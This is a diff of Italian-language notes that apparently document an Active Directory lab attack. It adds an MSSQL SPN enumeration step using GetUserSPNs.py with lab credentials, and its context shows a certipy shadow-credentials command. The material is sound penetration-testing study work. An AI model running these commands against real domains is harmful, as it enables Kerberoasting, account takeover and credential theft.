@@ -276,4 +276,7 @@ certipy-ad shadow auto -u khal.drogo@essos.local -p 'horse' -account 'viserys.ta
 ![[Pasted image 20230828173854.png]]
 
 ### **ENUM MSSQL**
-Controlliamo se ci sono utenti con SPN su MSSQL
+Controlliamo se ci sono utenti con SPN sul server MSSQL
+```bash
+GetUserSPNs.py north.sevenkingdoms.local/brandon.stark:iseedeadpeople
+```
